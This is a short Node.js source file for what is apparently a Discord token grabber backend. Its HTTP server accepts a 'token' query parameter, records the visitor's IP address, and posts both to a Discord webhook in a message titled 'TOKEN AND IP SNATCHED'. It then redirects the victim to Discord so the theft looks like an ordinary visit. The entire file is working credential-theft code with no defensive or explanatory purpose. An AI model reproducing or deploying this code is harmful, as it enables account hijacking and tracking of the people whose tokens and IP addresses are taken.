const http = require('http');
const url = require('url');
const fetch = require('node-fetch');

async function sendHook(ip, token) {
    var params = {
        username: "Token Grabber",
        avatar_url: "",
        embeds: [
            {
                "title": "TOKEN AND IP SNATCHED",
                "color": 15258703,
                "thumbnail": {
                    "url": "",
                },
                "fields": [
                    {
                        "name": "IP ADDRESS",
                        "value": `${ip}`,
                        "inline": true
                    },
                    {
                        "name": "TOKEN",
                        "value": `${token}`,
                        "inline": true
                    }
                ]
            }
        ]
    }
    fetch('https://discord.com/api/webhooks/id/token', {
        method: "POST",
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
    }).then(res => {
        console.log(res);
    })
}
const server = http.createServer((req, res) => {
    // Parse the request URL
    const parsedUrl = url.parse(req.url, true);

    if (parsedUrl.query.token) {
        var ip = (req.headers['x-forwarded-for'] || '').split(',').pop().trim() ||
            req.socket.remoteAddress
        sendHook(ip, parsedUrl.query.token)

    }
    res.writeHead(302, {
        'Location': 'https://discord.com/channels/@me',
        'Content-Type': 'text/plain'
    });

    res.end('Redirecting...');
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
